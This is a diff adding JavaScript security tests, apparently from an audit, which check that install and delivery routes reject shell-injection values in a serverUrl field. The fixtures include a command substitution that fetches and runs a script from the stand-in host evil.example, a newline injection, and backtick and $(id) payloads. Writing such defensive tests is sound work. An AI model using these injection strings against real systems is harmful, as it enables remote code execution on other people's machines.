@@ -184,3 +184,43 @@ test("installerDropName: degenerate and hostile ids still yield a safe, stable n
   assert.equal(installerDropName("AB!!cd12"), "t-abcd.sh", "non-alphanumerics stripped, lowercased");
   assert.equal(installerDropName("ab"), "t-ab.sh", "short ids keep what they have");
 });
+
+/* ── audit round 2 (Critical): a hostile serverUrl must never reach the
+   shell script the delivery routes build — on ssh-install it would execute
+   on the peer with no human in the loop ── */
+
+const HOSTILE_URL_SUB = "http://x/$(curl -fsSL evil.example/p|sh)";
+const HOSTILE_URL_NL = "http://x/\necho pwned";
+
+test("ssh-install rejects a hostile serverUrl with a 400 BEFORE any CLI invocation", async () => {
+  const sshCallsBefore = fakeCalls().filter((c) => c.argv[0] === "ssh").length;
+
+  for (const bad of [HOSTILE_URL_SUB, HOSTILE_URL_NL, "http://x/`id`", 'http://x/"$(id)"']) {
+    const r = await post(`/api/hosts/${host.id}/ssh-install`, { peer: PEER, token, serverUrl: bad });
+    assert.equal(r.status, 400, `serverUrl ${JSON.stringify(bad)} must be rejected, got ${r.status}`);
+  }
+  const sshCallsAfter = fakeCalls().filter((c) => c.argv[0] === "ssh").length;
+  assert.equal(sshCallsAfter, sshCallsBefore, "rejected before tailscale ssh was ever invoked");
+});
+
+test("taildrop and pair reject a hostile serverUrl too (same embed point, latent since #1)", async () => {
+  const cpCallsBefore = fakeCalls().filter((c) => c.argv[0] === "file").length;
+
+  const drop = await post(`/api/hosts/${host.id}/taildrop`, { peer: PEER, token, serverUrl: HOSTILE_URL_SUB });
+  assert.equal(drop.status, 400, "the dropped file must never carry shell syntax");
+  const pair = await post(`/api/hosts/${host.id}/pair`, { token, serverUrl: HOSTILE_URL_NL });
+  assert.equal(pair.status, 400, "a code must not be minted for a hostile serverUrl");
+
+  const cpCallsAfter = fakeCalls().filter((c) => c.argv[0] === "file").length;
+  assert.equal(cpCallsAfter, cpCallsBefore, "rejected before the CLI ran");
+});
+
+test("standaloneInstallScript itself refuses a hostile serverUrl (the choke point)", async () => {
+  const { standaloneInstallScript } = await import("../src/agentbundle.js");
+  assert.throws(() => standaloneInstallScript(host.id, HOSTILE_URL_SUB, token), /serverUrl/, "command substitution");
+  assert.throws(() => standaloneInstallScript(host.id, HOSTILE_URL_NL, token), /serverUrl/, "embedded newline");
+  /* and the legit forms the wizard actually sends still pass */
+  for (const ok of ["http://rewvis.tail208cbf.ts.net:4040", "https://rewvis.tail208cbf.ts.net", "http://100.64.0.1:4040", "http://192.168.1.10:4040", srv.base]) {
+    assert.ok(standaloneInstallScript(host.id, ok, token).startsWith("#!/bin/sh"), `legit ${ok} still installs`);
+  }
+});
